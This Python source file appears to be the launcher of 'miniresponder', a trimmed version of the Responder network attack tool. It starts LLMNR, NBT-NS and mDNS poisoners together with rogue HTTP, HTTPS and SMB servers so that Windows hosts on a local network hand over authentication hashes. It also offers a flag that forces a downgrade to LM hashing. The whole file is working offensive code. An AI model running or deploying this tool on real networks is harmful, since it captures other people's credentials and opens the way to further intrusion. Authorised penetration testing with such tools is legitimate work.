#!/usr/bin/env python3
import argparse
import ssl
import struct
import os
import sys
import time
from socketserver import TCPServer, UDPServer, ThreadingMixIn
from threading import Thread
from .utils import *

parser = argparse.ArgumentParser()
parser.add_argument('-I','-interface', action="store", help="Network interface to use. If not specified, the first non-loopback interface will be used.", dest="Interface", default=None)
parser.add_argument('-r','-respondonly', action="store_true", help="Respond only, don't start servers. Default: False", dest="RespondOnly", default=False)
parser.add_argument('-lm', action="store_true", help="Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False", dest="LM_On_Off", default=False)
parser.add_argument('-q', action="store_true", help="Only print hashes", dest="Quiet", default=False)
options = parser.parse_args()

settings.init()
settings.Config.populate(options)

if os.geteuid() != 0:
	print("[!] miniresponder must be run as root.")
	sys.exit(-1)

class ThreadingUDPServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		try:
			self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
			if settings.Config.IPv6:
				self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
		except Exception as e:
			print(e)
		UDPServer.server_bind(self)

class ThreadingTCPServer(ThreadingMixIn, TCPServer):
	def server_bind(self):
		try:
			self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
			if settings.Config.IPv6:
				self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
		except Exception as e:
			print(e)
		TCPServer.server_bind(self)

class ThreadingTCPServerAuth(ThreadingMixIn, TCPServer):
	def server_bind(self):
		try:
			self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
			if settings.Config.IPv6:
				self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
		except Exception as e:
			print(e)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
		TCPServer.server_bind(self)

class ThreadingNBTNSServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		try:
			self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
			if settings.Config.IPv6:
				self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
		except Exception as e:
			print(e)
		UDPServer.server_bind(self)
		if not settings.Config.Quiet:
			print("NBT-NS poisoner started")

class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		MADDR = "224.0.0.251"
		MADDR6 = 'ff02::fb'
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MADDR) + settings.Config.IP_aton)

		#IPV6:
		if settings.Config.IPv6:
			mreq = socket.inet_pton(socket.AF_INET6, MADDR6) + struct.pack('@I', if_nametoindex2(settings.Config.Interface))
			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
		try:
			self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
			if settings.Config.IPv6:
				self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
		except Exception as e:
			print(e)
		UDPServer.server_bind(self)
		if not settings.Config.Quiet:
			print("mDNS poisoner started")

class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		MADDR  = '224.0.0.252'
		MADDR6 = 'FF02:0:0:0:0:0:1:3'
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,socket.inet_aton(MADDR) + settings.Config.IP_aton)

		#IPV6:
		if settings.Config.IPv6:
			mreq = socket.inet_pton(socket.AF_INET6, MADDR6) + struct.pack('@I', if_nametoindex2(settings.Config.Interface))
			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
		try:
			self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
			if settings.Config.IPv6:
				self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
		except Exception as e:
			print(e)
		UDPServer.server_bind(self)
		if not settings.Config.Quiet:
			print("LLMNR poisoner started")

ThreadingUDPServer.allow_reuse_address = 1
if settings.Config.IPv6:
	ThreadingUDPServer.address_family = socket.AF_INET6

ThreadingNBTNSServer.allow_reuse_address = 1
if settings.Config.IPv6:
	ThreadingNBTNSServer.address_family = socket.AF_INET6

ThreadingTCPServer.allow_reuse_address = 1
if settings.Config.IPv6:
	ThreadingTCPServer.address_family = socket.AF_INET6

ThreadingUDPMDNSServer.allow_reuse_address = 1
if settings.Config.IPv6:
	ThreadingUDPMDNSServer.address_family = socket.AF_INET6

ThreadingUDPLLMNRServer.allow_reuse_address = 1
if settings.Config.IPv6:
	ThreadingUDPLLMNRServer.address_family = socket.AF_INET6

ThreadingTCPServerAuth.allow_reuse_address = 1
if settings.Config.IPv6:
	ThreadingTCPServerAuth.address_family = socket.AF_INET6

def serve_thread_udp_broadcast(host, port, handler):
	try:
		server = ThreadingUDPServer(('', port), handler)
		server.serve_forever()
	except:
		print("[!] Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_NBTNS_poisoner(host, port, handler):
	try:
		server = ThreadingNBTNSServer(('', port), handler)
		server.serve_forever()
	except:
		print("[!] Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_MDNS_poisoner(host, port, handler):
	try:
		server = ThreadingUDPMDNSServer(('', port), handler)
		server.serve_forever()
	except:
		print("[!] Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_LLMNR_poisoner(host, port, handler):
	try:
		server = ThreadingUDPLLMNRServer(('', port), handler)
		server.serve_forever()
	except:
		print("[!] Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_thread_udp(host, port, handler):
	try:
		server = ThreadingUDPServer(('', port), handler)
		server.serve_forever()
	except:
		print("[!] Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_thread_tcp(host, port, handler):
	try:
		server = ThreadingTCPServer(('', port), handler)
		server.serve_forever()
	except Exception:
		print("[!] Error starting TCP server on port " + str(port) + ", check permissions or other servers running.")

def serve_thread_tcp_auth(host, port, handler):
	try:
		server = ThreadingTCPServerAuth(('', port), handler)
		server.serve_forever()
	except:
		print("[!] Error starting TCP server on port " + str(port) + ", check permissions or other servers running.")

def serve_thread_SSL(host, port, handler):
	try:

		cert = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
		key =  os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)
		context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
		context.load_cert_chain(cert, key)
		server = ThreadingTCPServer(('', port), handler)
		server.socket = context.wrap_socket(server.socket, server_side=True)
		server.serve_forever()
	except:
		print("[!] Error starting SSL server on port " + str(port) + ", check permissions or other servers running.")

def main():
	try:
		threads = []

		# Load (M)DNS, NBNS and LLMNR Poisoners
		if settings.Config.LLMNR_On_Off:
			from .poisoners.LLMNR import LLMNR
			threads.append(Thread(target=serve_LLMNR_poisoner, args=('', 5355, LLMNR,)))

		if settings.Config.NBTNS_On_Off:
			from .poisoners.NBTNS import NBTNS
			threads.append(Thread(target=serve_NBTNS_poisoner, args=('', 137,  NBTNS,)))

		if settings.Config.MDNS_On_Off:
			from .poisoners.MDNS import MDNS
			threads.append(Thread(target=serve_MDNS_poisoner,  args=('', 5353, MDNS,)))

		if not settings.Config.RespondOnly and settings.Config.HTTP_On_Off:
			from .servers.HTTP import HTTP
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 80, HTTP,)))

		if not settings.Config.RespondOnly and settings.Config.SSL_On_Off:
			from .servers.HTTP import HTTP
			threads.append(Thread(target=serve_thread_SSL, args=(settings.Config.Bind_To, 443, HTTP,)))

		if not settings.Config.RespondOnly and settings.Config.SMB_On_Off:
			if settings.Config.LM_On_Off:
				from .servers.SMB import SMB1LM
				threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 445, SMB1LM,)))
				threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 139, SMB1LM,)))
			else:
				from .servers.SMB import SMB1
				threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 445, SMB1,)))
				threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 139, SMB1,)))

		for thread in threads:
			thread.daemon = True
			thread.start()

		while True:
			time.sleep(1)

	except KeyboardInterrupt:
		sys.exit("\rExiting...")

if __name__ == '__main__':
	sys.exit(main())
